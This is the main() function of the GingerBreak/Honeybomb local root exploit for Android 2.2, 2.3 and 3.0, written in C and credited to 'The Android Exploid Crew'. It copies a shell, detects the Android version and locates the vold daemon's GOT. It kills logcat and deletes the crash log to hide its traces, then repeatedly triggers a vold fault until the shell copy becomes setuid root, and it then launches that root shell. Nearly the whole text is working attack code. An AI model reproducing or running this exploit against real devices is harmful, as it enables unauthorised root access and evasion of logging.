int main(int argc, char **argv, char **env)
{
	uint32_t i = 0, j = 0, idx = 0;
	char *ash[] = {sh, 0};
	struct stat st;
	char build_id[256], version_release[256];

	if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], "boomsh"))
	{
	  printf("got tmp root!!!");
//	  char *afw[] = {fw, 0};
//	  execve(*afw, afw, env);
	  exit(0);
	}

	printf("\n[**] Gingerbreak/Honeybomb -- android 2.[2,3], 3.0 softbreak\n");
	printf("[**] (C) 2010-2011 The Android Exploid Crew. All rights reserved.\n");
	printf("[**] Kudos to jenzi, the #brownpants-party, the Open Source folks,\n");
	printf("[**] Zynamics for ARM skills and Onkel Budi\n\n");
	printf("[**] donate to [email protected] if you like\n[**] Exploit may take a while!\n\n");

	if (copy("/proc/self/exe", bsh) < 0 || copy("/system/bin/sh", sh) < 0)
		die("[-] Cannot copy boomsh.");

	chmod(bsh, 0711);

	__system_property_get("ro.build.id", build_id);
	__system_property_get("ro.build.version.release", version_release);

	if (strstr(build_id, "HONEY") || strstr(build_id, "Honey") || strstr(build_id, "honey") ||
	    strstr(version_release, "comb")) {
		printf("[+] Detected honeycomb! Starting honeybomb mode (scale=10).\n");
		scale = 10;
		honeycomb = 1;
	} else if (strstr(build_id, "FR") || strstr(build_id, "Fr") || strstr(build_id, "fr")) {
		printf("[+] Detected Froyo!\n");
		froyo = 1;
	} else
		printf("[+] Plain Gingerbread mode!\n");

	find_vold(&vold);
	find_got("/system/bin/vold");
	find_device();

	printf("[*] vold: %04d GOT start: 0x%08x GOT end: 0x%08x\n", vold.pid, vold.got_start,
	       vold.got_end);
	idx = find_index();

	kill(logcat_pid, SIGKILL);
	unlink(crashlog);

	for (i = idx; j++ < (vold.got_end - vold.got_start); --i) {
		if (do_fault(i, 0) < 0) {
			++i; --j;
			printf("[-] sendmsg() failed?\n");
			continue;
		}
		printf("[*] vold: %04d idx: %08d\n", vold.pid, -i); fflush(stdout);
		stat(sh, &st);
		if ((st.st_mode & 04000) == 04000) {
			printf("\n\n[!] dance forever my only one\n");
			break;
		}
	}

	/* Last try, sometimes vold cant handle 2 receives in the order
	 * we like by do_fault()
	 */
	if ((st.st_mode & 04000) != 04000) {
		last_try(); last_try();
		stat(sh, &st);
		if ((st.st_mode & 04000) == 04000) {
			printf("\n[+] You are in luck! Last try succeeded!\n");
		} else {
			printf("\n[-] Bad luck. Fixed vold?\n");
			exit(1);
		}
	}

	execve(*ash, ash, env);
	return 0;
}